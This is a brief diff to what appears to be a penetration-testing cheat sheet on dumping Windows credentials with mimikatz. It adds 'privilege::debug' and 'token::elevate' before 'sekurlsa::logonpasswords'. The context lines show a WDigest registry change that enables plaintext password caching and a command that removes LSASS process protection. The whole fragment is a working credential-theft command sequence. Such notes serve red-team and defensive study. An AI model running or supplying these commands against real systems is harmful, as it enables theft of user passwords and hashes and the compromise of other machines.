@@ -74,6 +74,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   mimikatz # !processprotect /process:lsass.exe /remove
 
   # Finally run the logonpasswords function to dump lsass
+  mimikatz # privilege::debug    
+  mimikatz # token::elevate
   mimikatz # sekurlsa::logonpasswords
   ```
 
